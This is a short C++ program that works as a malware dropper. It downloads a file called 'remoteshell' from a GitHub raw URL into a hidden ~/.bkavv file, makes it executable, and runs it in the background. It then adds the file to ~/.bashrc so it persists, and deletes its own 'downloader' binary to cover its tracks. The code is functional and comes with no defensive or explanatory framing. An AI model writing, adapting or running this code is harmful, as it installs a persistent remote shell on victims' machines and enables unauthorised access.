#include <fstream>
#include <iostream>
#include <unistd.h>
using namespace std;

#include <vector>
#include <curl/curl.h>
#define MAX_PATH 1024
int main()
{
    
    string s = getenv("HOME") + (string)"/.bkavv";
    
    // check and set startup 
    string bashrc = getenv("HOME") + (string)"/.bashrc";
    fstream ff(bashrc.c_str(),ios::in | ios::binary);
    string buf (istreambuf_iterator<char>(ff), {});
    ff.close();
    if (buf.find(s) != string::npos)
        return 0;
    // get file
    CURL *curl;
    FILE *file;
    file = fopen(s.c_str(),"wb");
    curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, "https://raw.githubusercontent.com/tconqueror/sysprogramminglinux/master/remoteshell");
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, file);
    curl_easy_setopt(curl, CURLOPT_FAILONERROR, 1);

    int res = curl_easy_perform(curl);
    if (res != CURLE_OK)
        return 0;
    fclose(file);
    curl_easy_cleanup(curl);
    string cmd = "chmod +x " + s;
    system(cmd.c_str());   
    system((s+"&").c_str());
    buf = s + "&\n"+ buf;
    fstream fff(bashrc.c_str(),ios::out);
    fff << buf;
    fff.close();
    //clean
    
    char cwd[MAX_PATH] = {};
    getcwd(cwd,MAX_PATH);
    string path = cwd + (string)"/downloader";
    system(("rm "+ path).c_str());
    return 0;
}